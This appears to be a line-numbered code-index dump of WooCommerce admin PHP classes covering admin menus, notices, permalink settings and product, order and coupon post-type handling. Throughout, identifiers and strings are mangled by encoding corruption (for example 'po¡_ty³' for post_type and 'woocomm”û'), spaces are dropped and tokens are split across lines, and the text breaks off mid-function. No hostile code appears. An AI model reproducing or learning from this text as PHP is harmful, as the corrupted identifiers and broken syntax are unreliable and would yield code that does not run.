$po¡_ty³
 ) ) {

104 iàĞ
	`š_¬¿y
Ğ
$po¡_ty³
, 
$to_highlight_ty³s
 ) ) {

105 
$subm’u_fe
 = 'ed™.php?po¡_ty³=' . 
	`esc_©Œ
Ğ
$po¡_ty³
 );

106 
$·»Á_fe
 = 'woocommerce';

109 iàĞ'´oduù' =ğ
$po¡_ty³
 ) {

110 
$sü“n
 = 
	`g‘_cu¼’t_sü“n
();

112 iàĞ
$sü“n
->
ba£
 =ğ'ed™-gs' && 
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$xÚomy
 ) ) {

113 
$subm’u_fe
 = 'product_attributes';

114 
$·»Á_fe
 = 'ed™.php?po¡_ty³=' . 
	`esc_©Œ
Ğ
$po¡_ty³
 );

119 iàĞ
	`is£t
Ğ
$subm’u
['woocommerce'] ) && isset( $submenu['woocommerce'][1] ) ) {

120 
$subm’u
['woocommerce'][0] = $submenu['woocommerce'][1];

121 
	`un£t
Ğ
$subm’u
['woocommerce'][1] );

125 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) ) {

126 
	`fÜ—ch
 ( 
$m’u
 
as
 
$key
 => 
$m’u_™em
 ) {

127 iàĞ
	`¡½os
Ğ
$m’u_™em
[0], 
	`_x
('Orders', 'Admin menu‚ame', 'woocommerce') ) === 0 ) {

129 
$m’u_Çme
 = 
	`_x
('Orders', 'Admin menu‚ame', 'woocommerce');

130 
$m’u_Çme_couÁ
 = '';

131 iàĞ
$Üd”_couÁ
 = 
	`wc_´oûssšg_Üd”_couÁ
() ) {

132 
$m’u_Çme_couÁ
 = " <¥ª cÏss='awa™šg-mod upd©e-¶ugš couÁ-$Üd”_couÁ'><¥ª cÏss='´oûssšg-couÁ'>" . 
	`numb”_fÜm©_i18n
Ğ
$Üd”_couÁ
 ) . "</span></span>" ;

135 
$m’u
[
$key
][0] = 
$m’u_Çme
 . 
$m’u_Çme_couÁ
;

136 
$subm’u
['ed™.php?po¡_ty³=shİ_Üd”'][5][0] = 
$m’u_Çme
;

141 
	}
}

149 
public
 
funùiÚ
 
	$m’u_Üd”
Ğ
$m’u_Üd”
 ) {

151 
$woocomm”û_m’u_Üd”
 = 
	`¬¿y
();

154 
$woocomm”û_£·¿tÜ
 = 
	`¬¿y_£¬ch
Ğ'£·¿tÜ-woocomm”û', 
$m’u_Üd”
 );

157 
$woocomm”û_´oduù
 = 
	`¬¿y_£¬ch
Ğ'ed™.php?po¡_ty³õroduù', 
$m’u_Üd”
 );

160 
	`fÜ—ch
 ( 
$m’u_Üd”
 
as
 
$šdex
 => 
$™em
 ) :

162 iàĞĞĞ'woocomm”û' ) =ğ
$™em
 ) ) :

163 
$woocomm”û_m’u_Üd”
[] = 'separator-woocommerce';

164 
$woocomm”û_m’u_Üd”
[] = 
$™em
;

165 
$woocomm”û_m’u_Üd”
[] = 'edit.php?post_type=product';

166 
	`un£t
Ğ
$m’u_Üd”
[
$woocomm”û_£·¿tÜ
] );

167 
	`un£t
Ğ
$m’u_Üd”
[
$woocomm”û_´oduù
] );

168 
	`–£if
 ( !
	`š_¬¿y
Ğ
$™em
, 
	`¬¿y
( 'separator-woocommerce' ) ) ) :

169 
$woocomm”û_m’u_Üd”
[] = 
$™em
;

170 
’dif
;

172 
’dfÜ—ch
;

175  
$woocomm”û_m’u_Üd”
;

176 
	}
}

182 
public
 
funùiÚ
 
	$cu¡om_m’u_Üd”
() {

183 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) )

184  
çl£
;

185  
Œue
;

186 
	}
}

191 
public
 
funùiÚ
 
	$»pÜts_·ge
() {

192 
	`šşude_Úû
( 'class-wc-admin-reports.php' );

193 
WC_Admš_R•Üts
::
	`ouut
();

194 
	}
}

199 
public
 
funùiÚ
 
	$£‰šgs_·ge
() {

200 
	`šşude_Úû
( 'class-wc-admin-settings.php' );

201 
WC_Admš_S‘tšgs
::
	`ouut
();

202 
	}
}

207 
public
 
funùiÚ
 
	$©Œibu‹s_·ge
() {

208 
$·ge
 = 
	`šşude
( 'class-wc-admin-attributes.php' );

209 
$·ge
->
	`ouut
();

210 
	}
}

215 
public
 
funùiÚ
 
	$¡©us_·ge
() {

216 
$·ge
 = 
	`šşude
( 'class-wc-admin-status.php' );

217 
$·ge
->
	`ouut
();

218 
	}
}

223 
public
 
funùiÚ
 
	$addÚs_·ge
() {

224 
$·ge
 = 
	`šşude
( 'class-wc-admin-addons.php' );

225 
$·ge
->
	`ouut
();

226 
	}
}

229 
	g’dif
;

231  
Ãw
 
WC_Admš_M’us
();

	@includes/admin/class-wc-admin-notices.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Notices' ) ) :

18 şas 
	cWC_Admš_NÙiûs
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'sw™ch_theme', 
	`¬¿y
Ğ
$this
, 'reset_admin_notices' ) );

25 
	`add_aùiÚ
Ğ'woocomm”û_upd©ed', 
	`¬¿y
Ğ
$this
, 'reset_admin_notices' ) );

26 
	`add_aùiÚ
Ğ'admš_´št_¡yËs', 
	`¬¿y
Ğ
$this
, 'add_notices' ) );

32 
public
 
funùiÚ
 
	$»£t_admš_nÙiûs
() {

33 
	`upd©e_İtiÚ
Ğ'woocomm”û_admš_nÙiûs', 
	`¬¿y
( 'template_files', 'theme_support' ) );

34 
	}
}

39 
public
 
funùiÚ
 
	$add_nÙiûs
() {

40 iàĞ
	`g‘_İtiÚ
( '_wc_needs_update' ) == 1 || get_option( '_wc_needs_pages' ) == 1 ) {

41 
	`wp_’queue_¡yË
Ğ'woocomm”û-aùiv©iÚ', 
	`¶ugšs_u¾
Ğ'/as£ts/css/aùiv©iÚ.css', 
WC_PLUGIN_FILE
 ) );

42 
	`add_aùiÚ
Ğ'admš_nÙiûs', 
	`¬¿y
Ğ
$this
, 'install_notice' ) );

45 
$nÙiûs
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_admš_nÙiûs', 
	`¬¿y
() );

47 iàĞ! 
	`em±y
Ğ
$_GET
['hide_theme_support_notice'] ) ) {

48 
$nÙiûs
 = 
	`¬¿y_diff
Ğ$nÙiûs, 
	`¬¿y
( 'theme_support' ) );

49 
	`upd©e_İtiÚ
Ğ'woocomm”û_admš_nÙiûs', 
$nÙiûs
 );

52 iàĞ! 
	`em±y
Ğ
$_GET
['hide_template_files_notice'] ) ) {

53 
$nÙiûs
 = 
	`¬¿y_diff
Ğ$nÙiûs, 
	`¬¿y
( 'template_files' ) );

54 
	`upd©e_İtiÚ
Ğ'woocomm”û_admš_nÙiûs', 
$nÙiûs
 );

57 iàĞ
	`š_¬¿y
Ğ'theme_suµÜt', 
$nÙiûs
 ) && ! 
	`cu¼’t_theme_suµÜts
( 'woocommerce' ) ) {

58 
$‹m¶©e
 = 
	`g‘_İtiÚ
( 'template' );

60 iàĞ! 
	`š_¬¿y
Ğ
$‹m¶©e
, 
	`¬¿y
( 'twentyfourteen', 'twentythirteen', 'twentyeleven', 'twentytwelve', 'twentyten' ) ) ) {

61 
	`wp_’queue_¡yË
Ğ'woocomm”û-aùiv©iÚ', 
	`¶ugšs_u¾
Ğ'/as£ts/css/aùiv©iÚ.css', 
WC_PLUGIN_FILE
 ) );

62 
	`add_aùiÚ
Ğ'admš_nÙiûs', 
	`¬¿y
Ğ
$this
, 'theme_check_notice' ) );

66 iàĞ
	`š_¬¿y
Ğ'‹m¶©e_fes', 
$nÙiûs
 ) ) {

67 
	`wp_’queue_¡yË
Ğ'woocomm”û-aùiv©iÚ', 
	`¶ugšs_u¾
Ğ'/as£ts/css/aùiv©iÚ.css', 
WC_PLUGIN_FILE
 ) );

68 
	`add_aùiÚ
Ğ'admš_nÙiûs', 
	`¬¿y
Ğ
$this
, 'template_file_check_notice' ) );

70 
	}
}

75 
public
 
funùiÚ
 
	$š¡®l_nÙiû
() {

77 iàĞ
	`g‘_İtiÚ
( '_wc_needs_update' ) == 1 ) {

78 
	`šşude
( 'views/html-notice-update.php' );

82 
	`–£if
 ( 
	`g‘_İtiÚ
( '_wc_needs_pages' ) == 1 ) {

83 
	`šşude
( 'views/html-notice-install.php' );

85 
	}
}

90 
public
 
funùiÚ
 
	$theme_check_nÙiû
() {

91 
	`šşude
( 'views/html-notice-theme-support.php' );

92 
	}
}

97 
public
 
funùiÚ
 
	$‹m¶©e_fe_check_nÙiû
() {

98 iàĞ
	`is£t
Ğ
$_GET
['page'] ) && 'wc-status' == $_GET['page'] ) {

102 
$¡©us
 = 
	`šşude
( 'class-wc-admin-status.php' );

103 
$cÜe_‹m¶©es
 = 
$¡©us
->
	`sÿn_‹m¶©e_fes
Ğ
	`WC
()->
	`¶ugš_·th
() . '/templates' );

104 
$outd©ed
 = 
çl£
;

106 
	`fÜ—ch
 ( 
$cÜe_‹m¶©es
 
as
 
$fe
 ) {

107 
$theme_fe
 = 
çl£
;

108 iàĞ
	`fe_exi¡s
Ğ
	`g‘_¡yËsh“t_dœeùÜy
(è. '/' . 
$fe
 ) ) {

109 
$theme_fe
 = 
	`g‘_¡yËsh“t_dœeùÜy
(è. '/' . 
$fe
;

110 } 
	`–£if
 ( 
	`fe_exi¡s
Ğ
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$fe
 ) ) {

111 
$theme_fe
 = 
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$fe
;

112 } 
	`–£if
 ( 
	`fe_exi¡s
Ğ
	`g‘_‹m¶©e_dœeùÜy
(è. '/' . 
$fe
 ) ) {

113 
$theme_fe
 = 
	`g‘_‹m¶©e_dœeùÜy
(è. '/' . 
$fe
;

114 } 
	`–£if
Ğ
	`fe_exi¡s
Ğ
	`g‘_‹m¶©e_dœeùÜy
(è. '/woocomm”û/' . 
$fe
 ) ) {

115 
$theme_fe
 = 
	`g‘_‹m¶©e_dœeùÜy
(è. '/woocomm”û/' . 
$fe
;

118 iàĞ
$theme_fe
 ) {

119 
$cÜe_v”siÚ
 = 
$¡©us
->
	`g‘_fe_v”siÚ
Ğ
	`WC
()->
	`¶ugš_·th
(è. '/‹m¶©es/' . 
$fe
 );

120 
$theme_v”siÚ
 = 
$¡©us
->
	`g‘_fe_v”siÚ
Ğ
$theme_fe
 );

122 iàĞ
$cÜe_v”siÚ
 && 
$theme_v”siÚ
 && 
	`v”siÚ_com·»
( $theme_version, $core_version, '<' ) ) {

123 
$outd©ed
 = 
Œue
;

129 iàĞ
$outd©ed
 ) {

130 
	`šşude
( 'views/html-notice-template-check.php' );

132 
	}
}

135 
	g’dif
;

137  
Ãw
 
WC_Admš_NÙiûs
();

	@includes/admin/class-wc-admin-permalink-settings.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Permalink_Settings' ) ) :

18 şas 
	cWC_Admš_P”m®šk_S‘tšgs
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'settings_init' ) );

25 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'settings_save' ) );

31 
public
 
funùiÚ
 
	$£‰šgs_š™
() {

33 
	`add_£‰šgs_£ùiÚ
Ğ'woocomm”û-³rm®šk', 
	`__
Ğ'Produù…”m®šk ba£', 'woocomm”û' ), 
	`¬¿y
Ğ
$this
, 'settings' ), 'permalink' );

36 
	`add_£‰šgs_f›ld
(

38 
	`__
( 'Product category base', 'woocommerce' ),

39 
	`¬¿y
Ğ
$this
, 'product_category_slug_input' ),

43 
	`add_£‰šgs_f›ld
(

45 
	`__
( 'Productag base', 'woocommerce' ),

46 
	`¬¿y
Ğ
$this
, 'product_tag_slug_input' ),

50 
	`add_£‰šgs_f›ld
(

52 
	`__
( 'Product‡ttribute base', 'woocommerce' ),

53 
	`¬¿y
Ğ
$this
, 'product_attribute_slug_input' ),

57 
	}
}

62 
public
 
funùiÚ
 
	$´oduù_ÿ‹gÜy_¦ug_šput
() {

63 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

65 <
šput
 
Çme
="woocomm”û_´oduù_ÿ‹gÜy_¦ug" 
ty³
="‹xt" 
şass
="»guÏr-‹xˆcode" 
v®ue
="<?ph°iàĞis£tĞ$³rm®šks['ÿ‹gÜy_ba£'] ) )ƒchØesc_©ŒĞ$³rm®šks['ÿ‹gÜy_ba£'] ); ?>" 
¶aûhŞd”
="<?phpƒcho _x('product-category', 'slug', 'woocommerce') ?>" />

66 <?
php


67 
	}
}

72 
public
 
funùiÚ
 
	$´oduù_g_¦ug_šput
() {

73 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

75 <
šput
 
Çme
="woocomm”û_´oduù_g_¦ug" 
ty³
="‹xt" 
şass
="»guÏr-‹xˆcode" 
v®ue
="<?ph°iàĞis£tĞ$³rm®šks['g_ba£'] ) )ƒchØesc_©ŒĞ$³rm®šks['g_ba£'] ); ?>" 
¶aûhŞd”
="<?phpƒcho _x('product-tag', 'slug', 'woocommerce') ?>" />

76 <?
php


77 
	}
}

82 
public
 
funùiÚ
 
	$´oduù_©Œibu‹_¦ug_šput
() {

83 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

85 <
šput
 
Çme
="woocomm”û_´oduù_©Œibu‹_¦ug" 
ty³
="‹xt" 
şass
="»guÏr-‹xˆcode" 
v®ue
="<?ph°iàĞis£tĞ$³rm®šks['©Œibu‹_ba£'] ) )ƒchØesc_©ŒĞ$³rm®šks['©Œibu‹_ba£'] ); ?>" /><
code
>/
©Œibu‹
-name/attribute/</code>

86 <?
php


87 
	}
}

92 
public
 
funùiÚ
 
	$£‰šgs
() {

93 
echo
 
	`w·utİ
Ğ
	`__
( 'These settings controlhe…ermalinks used for…roducts. These settings only‡pply when <strong>not using "default"…ermalinks‡bove</strong>.', 'woocommerce' ) );

95 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

96 
$´oduù_³rm®šk
 = 
$³rm®šks
['product_base'];

99 
$shİ_·ge_id
 = 
	`wc_g‘_·ge_id
( 'shop' );

100 
$ba£_¦ug
 = ( 
$shİ_·ge_id
 > 0 && 
	`g‘_·ge
Ğ$shİ_·ge_id ) ) ? 
	`g‘_·ge_uri
Ğ$shİ_·ge_id ) : 
	`_x
( 'shop', 'default-slug', 'woocommerce' );

101 
$´oduù_ba£
 = 
	`_x
( 'product', 'default-slug', 'woocommerce' );

103 
$¡ruùu»s
 = 
	`¬¿y
(

105 1 => '/' . 
	`Œašg¦ash™
Ğ
$´oduù_ba£
 ),

106 2 => '/' . 
	`Œašg¦ash™
Ğ
$ba£_¦ug
 ),

107 3 => '/' . 
	`Œašg¦ash™
Ğ
$ba£_¦ug
 ) .railingslashit( '%product_cat%' )

110 <
bË
 
şass
="form-table">

111 <
tbody
>

112 <
Œ
>

113 <
th
><
Ïb–
><
šput
 
Çme
="´oduù_³rm®šk" 
ty³
="¿dio" 
v®ue
="<?ph°echØ$¡ruùu»s[0]; ?>" 
şass
="wùog" <?
php
 
	`checked
Ğ
$¡ruùu»s
[0], 
$´oduù_³rm®šk
 ); ?> /> <?ph°
	`_e
( 'Default', 'woocommerce' ); ?></label></th>

114 <
td
><
code
><?
php
 
echo
 
	`home_u¾
(); ?>/?
´oduù
=
§m¶e
-product</code></td>

115 </
Œ
>

116 <
Œ
>

117 <
th
><
Ïb–
><
šput
 
Çme
="´oduù_³rm®šk" 
ty³
="¿dio" 
v®ue
="<?ph°echØ$¡ruùu»s[1]; ?>" 
şass
="wùog" <?
php
 
	`checked
Ğ
$¡ruùu»s
[1], 
$´oduù_³rm®šk
 ); ?> /> <?ph°
	`_e
( 'Product', 'woocommerce' ); ?></label></th>

118 <
td
><
code
><?
php
 
echo
 
	`home_u¾
(); ?>/<?ph°echØ
$´oduù_ba£
; ?>/
§m¶e
-
´oduù
/</code></td>

119 </
Œ
>

120 <?
php
 iàĞ
$shİ_·ge_id
 ) : ?>

121 <
Œ
>

122 <
th
><
Ïb–
><
šput
 
Çme
="´oduù_³rm®šk" 
ty³
="¿dio" 
v®ue
="<?ph°echØ$¡ruùu»s[2]; ?>" 
şass
="wùog" <?
php
 
	`checked
Ğ
$¡ruùu»s
[2], 
$´oduù_³rm®šk
 ); ?> /> <?ph°
	`_e
( 'Shop base', 'woocommerce' ); ?></label></th>

123 <
td
><
code
><?
php
 
echo
 
	`home_u¾
(); ?>/<?ph°echØ
$ba£_¦ug
; ?>/
§m¶e
-
´oduù
/</code></td>

124 </
Œ
>

125 <
Œ
>

126 <
th
><
Ïb–
><
šput
 
Çme
="´oduù_³rm®šk" 
ty³
="¿dio" 
v®ue
="<?ph°echØ$¡ruùu»s[3]; ?>" 
şass
="wùog" <?
php
 
	`checked
Ğ
$¡ruùu»s
[3], 
$´oduù_³rm®šk
 ); ?> /> <?ph°
	`_e
( 'Shop base with category', 'woocommerce' ); ?></label></th>

127 <
td
><
code
><?
php
 
echo
 
	`home_u¾
(); ?>/<?ph°echØ
$ba£_¦ug
; ?>/
´oduù
-
ÿ‹gÜy
/
§m¶e
-product/</code></td>

128 </
Œ
>

129 <?
php
 
’dif
; ?>

130 <
Œ
>

131 <
th
><
Ïb–
><
šput
 
Çme
="´oduù_³rm®šk" 
id
="woocomm”û_cu¡om_£ËùiÚ" 
ty³
="¿dio" 
v®ue
="cu¡om" 
şass
="tog" <?
php
 
	`checked
Ğ
	`š_¬¿y
Ğ
$´oduù_³rm®šk
, 
$¡ruùu»s
 ), 
çl£
 ); ?> />

132 <?
php
 
	`_e
Ğ'Cu¡om Ba£', 'woocomm”û' ); ?></
Ïb–
></
th
>

133 <
td
>

134 <
šput
 
Çme
="´oduù_³rm®šk_¡ruùu»" 
id
="woocomm”û_³rm®šk_¡ruùu»" 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞ$´oduù_³rm®šk ); ?>" 
şass
="»guÏr-‹xˆcode"> <
¥ª
 cÏss="desütiÚ"><?
php
 
	`_e
( 'Enter‡ custom baseo use. A base <strong>must</strong> be set or WordPress will use default instead.', 'woocommerce' ); ?></span>

135 </
td
>

136 </
Œ
>

137 </
tbody
>

138 </
bË
>

139 <
süt
 
ty³
="text/javascript">

140 
	`jQu”y
(
	`funùiÚ
(){

141 
	`jQu”y
('šput.wùog').
	`chªge
(
	`funùiÚ
() {

142 
	`jQu”y
('#woocomm”û_³rm®šk_¡ruùu»').
	`v®
ĞjQu”y(
this
).val() );

145 
	`jQu”y
('#woocomm”û_³rm®šk_¡ruùu»').
	`focus
(
	`funùiÚ
(){

146 
	`jQu”y
('#woocomm”û_cu¡om_£ËùiÚ').
	`şick
();

149 </
süt
>

150 <?
php


151 
	}
}

156 
public
 
funùiÚ
 
	$£‰šgs_§ve
() {

157 iàĞ! 
	`is_admš
() )

161 iàĞ
	`is£t
Ğ
$_POST
['permalink_structure'] ) || isset( $_POST['category_base'] ) && isset( $_POST['product_permalink'] ) ) {

163 
$woocomm”û_´oduù_ÿ‹gÜy_¦ug
 = 
	`wc_ş—n
Ğ
$_POST
['woocommerce_product_category_slug'] );

164 
$woocomm”û_´oduù_g_¦ug
 = 
	`wc_ş—n
Ğ
$_POST
['woocommerce_product_tag_slug'] );

165 
$woocomm”û_´oduù_©Œibu‹_¦ug
 = 
	`wc_ş—n
Ğ
$_POST
['woocommerce_product_attribute_slug'] );

167 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

168 iàĞ! 
$³rm®šks
 )

169 
$³rm®šks
 = 
	`¬¿y
();

171 
$³rm®šks
['ÿ‹gÜy_ba£'] = 
	`uÁ¿šg¦ash™
Ğ
$woocomm”û_´oduù_ÿ‹gÜy_¦ug
 );

172 
$³rm®šks
['g_ba£'] = 
	`uÁ¿šg¦ash™
Ğ
$woocomm”û_´oduù_g_¦ug
 );

173 
$³rm®šks
['©Œibu‹_ba£'] = 
	`uÁ¿šg¦ash™
Ğ
$woocomm”û_´oduù_©Œibu‹_¦ug
 );

176 
$´oduù_³rm®šk
 = 
	`wc_ş—n
Ğ
$_POST
['product_permalink'] );

178 iàĞ
$´oduù_³rm®šk
 == 'custom' ) {

180 
$´oduù_³rm®šk
 = 
	`Œim
Ğ
	`wc_ş—n
Ğ
$_POST
['product_permalink_structure'] ), '/' );

183 iàĞ'%´oduù_ÿt%' =ğ
$´oduù_³rm®šk
 ) {

184 
$´oduù_³rm®šk
 = 
	`_x
( 'product', 'slug', 'woocommerce' ) . '/' . $product_permalink;

188 
$´oduù_³rm®šk
 = '/' . $product_permalink;

189 } 
	`–£if
 ( 
	`em±y
Ğ
$´oduù_³rm®šk
 ) ) {

190 
$´oduù_³rm®šk
 = 
çl£
;

193 
$³rm®šks
['´oduù_ba£'] = 
	`uÁ¿šg¦ash™
Ğ
$´oduù_³rm®šk
 );

195 
	`upd©e_İtiÚ
Ğ'woocomm”û_³rm®šks', 
$³rm®šks
 );

197 
	}
}

200 
	g’dif
;

202  
Ãw
 
WC_Admš_P”m®šk_S‘tšgs
();

	@includes/admin/class-wc-admin-post-types.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Post_Types' ) ) :

18 şas 
	cWC_Admš_Po¡_Ty³s
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'include_post_type_handlers' ) );

25 
	`add_f‹r
Ğ'po¡_upd©ed_mes§ges', 
	`¬¿y
Ğ
$this
, 'post_updated_messages' ) );

26 
	`add_aùiÚ
Ğ'admš_´št_süts', 
	`¬¿y
Ğ
$this
, 'disable_autosave' ) );

29 
	`add_aùiÚ
Ğ'd–‘e_po¡', 
	`¬¿y
Ğ
$this
, 'delete_post' ) );

30 
	`add_aùiÚ
Ğ'wp_Œash_po¡', 
	`¬¿y
Ğ
$this
, 'trash_post' ) );

31 
	`add_aùiÚ
Ğ'uÁ¿sh_po¡', 
	`¬¿y
Ğ
$this
, 'untrash_post' ) );

37 
public
 
funùiÚ
 
	$šşude_po¡_ty³_hªdËrs
() {

38 
	`šşude
( 'post-types/class-wc-admin-meta-boxes.php' );

39 
	`šşude
( 'post-types/class-wc-admin-cpt-product.php' );

40 
	`šşude
( 'post-types/class-wc-admin-cpt-shop_order.php' );

41 
	`šşude
( 'post-types/class-wc-admin-cpt-shop_coupon.php' );

43 iàĞ! 
	`funùiÚ_exi¡s
( 'duplicate_post_plugin_activation' ) )

44 
	`šşude
( 'class-wc-admin-duplicate-product.php' );

45 
	}
}

53 
public
 
funùiÚ
 
	$po¡_upd©ed_mes§ges
Ğ
$mes§ges
 ) {

54 
glob®
 
$po¡
, 
$po¡_ID
;

56 
$mes§ges
['´oduù'] = 
	`¬¿y
(

58 1 => 
	`¥rštf
Ğ
	`__
Ğ'Produù upd©ed. <¨h»f="%s">V›w Produù</a>', 'woocomm”û' ), 
	`esc_u¾
Ğ
	`g‘_³rm®šk
(
$po¡_ID
) ) ),

59 2 => 
	`__
( 'Custom field updated.', 'woocommerce' ),

60 3 => 
	`__
( 'Custom field deleted.', 'woocommerce' ),

61 4 => 
	`__
( 'Product updated.', 'woocommerce' ),

62 5 => 
	`is£t
(
$_GET
['»visiÚ']è? 
	`¥rštf
Ğ
	`__
Ğ'Produù„e¡ÜedØ»visiÚ from %s', 'woocomm”û' ), 
	`wp_po¡_»visiÚ_t™Ë
Ğ(è$_GET['»visiÚ'], 
çl£
 ) ) : false,

63 6 => 
	`¥rštf
Ğ
	`__
Ğ'Produù…ublished. <¨h»f="%s">V›w Produù</a>', 'woocomm”û' ), 
	`esc_u¾
Ğ
	`g‘_³rm®šk
(
$po¡_ID
) ) ),

64 7 => 
	`__
( 'Product saved.', 'woocommerce' ),

65 8 => 
	`¥rštf
Ğ
	`__
Ğ'Produù subm™‹d. <¨rg‘="_bÏnk" h»f="%s">P»v›w Produù</a>', 'woocomm”û' ), 
	`esc_u¾
Ğ
	`add_qu”y_¬g
Ğ'´ev›w', 'Œue', 
	`g‘_³rm®šk
(
$po¡_ID
) ) ) ),

66 9 => 
	`¥rštf
Ğ
	`__
( 'Product scheduled for: <strong>%1$s</strong>. <aarget="_blank" href="%2$s">Preview Product</a>', 'woocommerce' ),

67 
	`d©e_i18n
Ğ
	`__
Ğ'M j, Y @ G:i', 'woocomm”û' ), 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ), 
	`esc_u¾
Ğ
	`g‘_³rm®šk
(
$po¡_ID
) ) ),

68 10 => 
	`¥rštf
Ğ
	`__
Ğ'Produù d¿á upd©ed. <¨rg‘="_bÏnk" h»f="%s">P»v›w Produù</a>', 'woocomm”û' ), 
	`esc_u¾
Ğ
	`add_qu”y_¬g
Ğ'´ev›w', 'Œue', 
	`g‘_³rm®šk
(
$po¡_ID
) ) ) ),

71 
$mes§ges
['shİ_Üd”'] = 
	`¬¿y
(

73 1 => 
	`__
( 'Order updated.', 'woocommerce' ),

74 2 => 
	`__
( 'Custom field updated.', 'woocommerce' ),

75 3 => 
	`__
( 'Custom field deleted.', 'woocommerce' ),

76 4 => 
	`__
( 'Order updated.', 'woocommerce' ),

77 5 => 
	`is£t
(
$_GET
['»visiÚ']è? 
	`¥rštf
Ğ
	`__
Ğ'Ord”„e¡ÜedØ»visiÚ from %s', 'woocomm”û' ), 
	`wp_po¡_»visiÚ_t™Ë
Ğ(è$_GET['»visiÚ'], 
çl£
 ) ) : false,

78 6 => 
	`__
( 'Order updated.', 'woocommerce' ),

79 7 => 
	`__
( 'Order saved.', 'woocommerce' ),

80 8 => 
	`__
( 'Order submitted.', 'woocommerce' ),

81 9 => 
	`¥rštf
Ğ
	`__
( 'Order scheduled for: <strong>%1$s</strong>.', 'woocommerce' ),

82 
	`d©e_i18n
Ğ
	`__
Ğ'M j, Y @ G:i', 'woocomm”û' ), 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ) ),

83 10 => 
	`__
( 'Order draft updated.', 'woocommerce' )

86 
$mes§ges
['shİ_coupÚ'] = 
	`¬¿y
(

88 1 => 
	`__
( 'Coupon updated.', 'woocommerce' ),

89 2 => 
	`__
( 'Custom field updated.', 'woocommerce' ),

90 3 => 
	`__
( 'Custom field deleted.', 'woocommerce' ),

91 4 => 
	`__
( 'Coupon updated.', 'woocommerce' ),

92 5 => 
	`is£t
(
$_GET
['»visiÚ']è? 
	`¥rštf
Ğ
	`__
Ğ'CoupÚ„e¡ÜedØ»visiÚ from %s', 'woocomm”û' ), 
	`wp_po¡_»visiÚ_t™Ë
Ğ(è$_GET['»visiÚ'], 
çl£
 ) ) : false,

93 6 => 
	`__
( 'Coupon updated.', 'woocommerce' ),

94 7 => 
	`__
( 'Coupon saved.', 'woocommerce' ),

95 8 => 
	`__
( 'Coupon submitted.', 'woocommerce' ),

96 9 => 
	`¥rštf
Ğ
	`__
( 'Coupon scheduled for: <strong>%1$s</strong>.', 'woocommerce' ),

97 
	`d©e_i18n
Ğ
	`__
Ğ'M j, Y @ G:i', 'woocomm”û' ), 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ) ),

98 10 => 
	`__
( 'Coupon draft updated.', 'woocommerce' )

101  
$mes§ges
;

102 
	}
}

110 
public
 
funùiÚ
 
	$di§bË_auto§ve
(){

111 
glob®
 
$po¡
;

113 iàĞ
$po¡
 && 
	`g‘_po¡_ty³
Ğ$po¡->
ID
 ) === 'shop_order' ) {

114 
	`wp_dequeue_süt
( 'autosave' );

116 
	}
}

125 
public
 
funùiÚ
 
	$d–‘e_po¡
Ğ
$id
 ) {

126 
glob®
 
$woocomm”û
, 
$wpdb
;

128 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'delete_posts' ) )

131 iàĞ
$id
 > 0 ) {

133 
$po¡_ty³
 = 
	`g‘_po¡_ty³
Ğ
$id
 );

135  
$po¡_ty³
 ) {

138 
$chd_´oduù_v¬ŸtiÚs
 = 
	`g‘_chd»n
Ğ'po¡_·»Á=' . 
$id
 . '&post_type=product_variation' );

140 iàĞ
$chd_´oduù_v¬ŸtiÚs
 ) {

141 
	`fÜ—ch
 ( 
$chd_´oduù_v¬ŸtiÚs
 
as
 
$chd
 ) {

142 
	`wp_d–‘e_po¡
Ğ
$chd
->
ID
, 
Œue
 );

146 
$chd_´oduùs
 = 
	`g‘_chd»n
Ğ'po¡_·»Á=' . 
$id
 . '&post_type=product' );

148 iàĞ
$chd_´oduùs
 ) {

149 
	`fÜ—ch
 ( 
$chd_´oduùs
 
as
 
$chd
 ) {

150 
$chd_po¡
 = 
	`¬¿y
();

151 
$chd_po¡
['ID'] = 
$chd
->
ID
;

152 
$chd_po¡
['post_parent'] = 0;

153 
	`wp_upd©e_po¡
Ğ
$chd_po¡
 );

157 
	`wc_d–‘e_´oduù_Œªs›Ás
();

162 
	`wc_d–‘e_´oduù_Œªs›Ás
();

167 
	}
}

176 
public
 
funùiÚ
 
	$Œash_po¡
Ğ
$id
 ) {

177 iàĞ
$id
 > 0 ) {

179 
$po¡_ty³
 = 
	`g‘_po¡_ty³
Ğ
$id
 );

181 iàĞ'shİ_Üd”' =ğ
$po¡_ty³
 ) {

184 
$u£r_id
 = 
	`g‘_po¡_m‘a
Ğ
$id
, '_cu¡om”_u£r', 
Œue
 );

186 iàĞ
$u£r_id
 > 0 ) {

187 
	`upd©e_u£r_m‘a
